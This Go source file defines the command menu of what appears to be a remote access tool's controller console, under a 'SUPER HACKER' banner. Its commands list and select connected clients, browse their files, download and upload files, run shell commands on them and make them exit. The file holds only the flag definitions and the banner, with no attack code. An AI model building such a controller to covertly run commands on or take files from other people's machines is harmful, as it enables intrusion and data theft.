package main

import (
	"fmt"
	"github.com/jessevdk/go-flags"
)
//导出的参数一定要大写
var suicide_Option struct {}

var wait_Option struct {}

var clear_Option struct {}

var lsc_Option struct {
	Live uint `short:"l" long:"live" default:"0" description:"上一次心跳包距现在最大时间(s)"`
}

var c_Option struct {}//没有附加命令行参数,所以为空

var pcc_Option struct {}

var lsf_Option struct {}

var cd_Option struct {}

var pwd_Option struct {}
//因为bool不支持default,需要默认值为true的bool时就反向思考一下,还需要手动初始化
var download_Option struct {
	Compress bool `short:"c" long:"CancelCompression" description:"传输文件时取消压缩"`
}

var upload_Option struct {
	Compress bool `short:"c" long:"CancelCompression" description:"传输文件时取消压缩"`
}

var cmd_Option struct {
	Wait bool `short:"w" long:"wait" description:"执行命令后是否等待结果,没有输出的命令会导致线程阻塞"`
}

var FlagParser flags.Parser
func InitFlag(){
	cmd_Option.Wait=false
	FlagParser=*flags.NewParser(nil, flags.Default)
	FlagParser.AddCommand("suicide","让选中客户端退出","让选中客户端退出",&suicide_Option)
	FlagParser.AddCommand("wait","设置等待命令执行反馈的最长时间(s),在可能导致客户端长久阻塞的命令前使用","设置等待命令执行反馈的最长时间(s),在可能导致客户端长久阻塞的命令前使用",&wait_Option)
	FlagParser.AddCommand("clear","清屏(程序用cmd启动时才有效)","清屏(程序用cmd启动时才有效)",&clear_Option)
	FlagParser.AddCommand("lsc","列出当前所有客户端: lsc 可选参数: -l=上一次心跳包距现在最长时间(s)","列出当前所有客户端: lsc 可选参数: -l=上一次心跳包距现在最长时间(s)",&lsc_Option)
	FlagParser.AddCommand("c","选中一个客户端,后续其他操作都是针对此客户端: c 使用lsc命令后显示的编号或ip:port;如c 1或c 127.0.0.1:2333","选中一个客户端,后续其他操作都是针对此客户端: c 使用lsc命令后显示的的编号或ip:port;如c 1或c 127.0.0.1:2333",&c_Option)
	FlagParser.AddCommand("pcc","显示当前选中客户端","显示当前选中客户端",&pcc_Option)
	FlagParser.AddCommand("lsf","列出当前目录下所有文件夹和文件","列出当前目录下所有文件夹和文件",&lsf_Option)
	FlagParser.AddCommand("cd","进入文件夹","进入文件夹",&cd_Option)
	FlagParser.AddCommand("pwd","显示当前工作目录","显示当前工作目录",&pwd_Option)
	FlagParser.AddCommand("download","download 客户端中待下载的文件路径 下载到的路径;带有空格的路径必须用引号括起来,可以是完整或相对路径;如download D:\\a.txt D:\\b.txt","download 客户端中待下载的文件路径 下载到的路径;带有空格的路径必须用引号括起来,可以是完整或相对路径;如download D:\\a.txt D:\\b.txt",&download_Option)
	FlagParser.AddCommand("upload","upload 待上传的文件路径 上传到客户端的文件路径;带有空格的路径必须用引号括起来,可以是完整或相对路径;如upload D:\\b.txt D:\\a.txt","upload 待上传的文件路径 上传到客户端的文件路径;带有空格的路径必须用引号括起来,可以是完整或相对路径;如upload D:\\b.txt D:\\a.txt",&upload_Option)
	FlagParser.AddCommand("cmd","在当前工作目录执行命令 可选参数: -w控制是否读取回显,没有输出的命令会导致客户端阻塞","在当前工作目录执行命令 可选参数: -w控制是否读取回显,没有输出的命令会导致客户端阻塞",&cmd_Option)
}

func logo(){
	fmt.Println("     _______. __    __  .______    _______ .______          __    __       ___       ______  __  ___  _______ .______        ")
	fmt.Println("    /       ||  |  |  | |   _  \\  |   ____||   _  \\        |  |  |  |     /   \\     /      ||  |/  / |   ____||   _  \\     ")
	fmt.Println("   |   (----`|  |  |  | |  |_)  | |  |__   |  |_)  |       |  |__|  |    /  ^  \\   |  ,----'|  '  /  |  |__   |  |_)  |    ")
	fmt.Println("    \\   \\    |  |  |  | |   ___/  |   __|  |      /        |   __   |   /  /_\\  \\  |  |     |    <   |   __|  |      /     ")
	fmt.Println(".----)   |   |  `--'  | |  |      |  |____ |  |\\  \\----.   |  |  |  |  /  _____  \\ |  `----.|  .  \\  |  |____ |  |\\  \\----.")
	fmt.Println("|_______/     \\______/  | _|      |_______|| _| `._____|   |__|  |__| /__/     \\__\\ \\______||__|\\__\\ |_______|| _| `._____|")
	fmt.Println("   ")
	fmt.Println(".------..------..------..------.")
	fmt.Println("|0.--. ||X.--. ||F.--. ||A.--. |")
	fmt.Println("| :/\\: || :/\\: || :(): || (\\/) |")
	fmt.Println("| :\\/: || (__) || ()() || :\\/: |")
	fmt.Println("| '--'0|| '--'X|| '--'F|| '--'A|")
	fmt.Println("`------'`------'`------'`------'")
}